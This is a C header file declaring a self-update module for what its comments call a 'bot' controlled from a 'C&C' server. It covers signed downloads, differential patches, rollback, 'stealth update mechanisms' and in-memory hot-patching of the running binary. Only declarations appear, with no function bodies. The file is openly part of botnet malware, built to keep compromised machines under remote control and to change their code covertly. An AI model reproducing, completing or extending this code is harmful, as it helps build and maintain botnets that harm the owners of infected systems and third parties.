/**
 * @file self_update.h
 * @brief Secure over-the-air (OTA) update system
 * 
 * This module handles secure binary updates from C&C:
 * - Cryptographic signature verification
 * - Incremental/differential updates
 * - Rollback on failure
 * - Update versioning and compatibility checks
 * - Stealth update mechanisms
 */

#ifndef SELF_UPDATE_H
#define SELF_UPDATE_H

#include <stdint.h>
#include <stdbool.h>

// Update status
typedef enum {
    UPDATE_STATUS_IDLE = 0,
    UPDATE_STATUS_CHECKING,
    UPDATE_STATUS_DOWNLOADING,
    UPDATE_STATUS_VERIFYING,
    UPDATE_STATUS_APPLYING,
    UPDATE_STATUS_SUCCESS,
    UPDATE_STATUS_FAILED,
    UPDATE_STATUS_ROLLBACK
} update_status_t;

// Update method
typedef enum {
    UPDATE_METHOD_FULL = 0,      // Full binary replacement
    UPDATE_METHOD_DIFFERENTIAL,  // Differential/patch update
    UPDATE_METHOD_HOT_PATCH      // In-memory patching (no restart)
} update_method_t;

// Update metadata
typedef struct {
    char version[32];
    uint32_t build_number;
    uint64_t binary_size;
    uint8_t signature[64];       // Ed25519 signature
    char download_url[512];
    update_method_t method;
    bool requires_restart;
    char changelog[1024];
} update_metadata_t;

// Update context
typedef struct update_context update_context_t;

/**
 * Initialize update system
 * 
 * @param cnc_url C&C server URL for update checks
 * @param public_key_path Path to Ed25519 public key for verification
 * @return Update context or NULL on error
 */
update_context_t *update_init(const char *cnc_url, const char *public_key_path);

/**
 * Check for available updates
 * 
 * @param ctx Update context
 * @param current_version Current bot version
 * @param metadata Output: update metadata (if available)
 * @return true if update available, false otherwise
 */
bool update_check_available(update_context_t *ctx, 
                            const char *current_version,
                            update_metadata_t *metadata);

/**
 * Download update binary
 * 
 * @param ctx Update context
 * @param metadata Update metadata
 * @param output_path Where to save downloaded file
 * @return 0 on success, -1 on error
 */
int update_download(update_context_t *ctx,
                   update_metadata_t *metadata,
                   const char *output_path);

/**
 * Verify update signature
 * 
 * @param ctx Update context
 * @param binary_path Path to downloaded binary
 * @param expected_signature Expected signature from metadata
 * @return true if signature valid, false otherwise
 */
bool update_verify_signature(update_context_t *ctx,
                             const char *binary_path,
                             const uint8_t *expected_signature);

/**
 * Apply update
 * 
 * @param ctx Update context
 * @param binary_path Path to verified binary
 * @param method Update method to use
 * @return 0 on success, -1 on error
 */
int update_apply(update_context_t *ctx,
                const char *binary_path,
                update_method_t method);

/**
 * Rollback to previous version
 * 
 * @param ctx Update context
 * @return 0 on success, -1 on error
 */
int update_rollback(update_context_t *ctx);

/**
 * Get update status
 * 
 * @param ctx Update context
 * @return Current update status
 */
update_status_t update_get_status(update_context_t *ctx);

/**
 * Automatic update check and apply
 * This is the main function to call periodically
 * 
 * @param ctx Update context
 * @param current_version Current version
 * @param auto_apply Whether to auto-apply updates
 * @return 0 on success, -1 on error
 */
int update_auto_check_and_apply(update_context_t *ctx,
                               const char *current_version,
                               bool auto_apply);

/**
 * Cleanup update system
 */
void update_cleanup(update_context_t *ctx);

// Advanced features

/**
 * Generate differential patch from two binaries
 * 
 * @param old_binary Path to old binary
 * @param new_binary Path to new binary
 * @param patch_output Path to save patch
 * @return 0 on success, -1 on error
 */
int update_generate_patch(const char *old_binary,
                          const char *new_binary,
                          const char *patch_output);

/**
 * Apply differential patch
 * 
 * @param current_binary Current binary path
 * @param patch_file Patch file path
 * @param output_binary Output path for patched binary
 * @return 0 on success, -1 on error
 */
int update_apply_patch(const char *current_binary,
                      const char *patch_file,
                      const char *output_binary);

/**
 * Hot-patch in-memory code
 * This patches the running binary without restart (advanced!)
 * 
 * @param patch_data Patch data
 * @param patch_size Patch size
 * @return 0 on success, -1 on error
 */
int update_hot_patch(const void *patch_data, size_t patch_size);

#endif // SELF_UPDATE_H
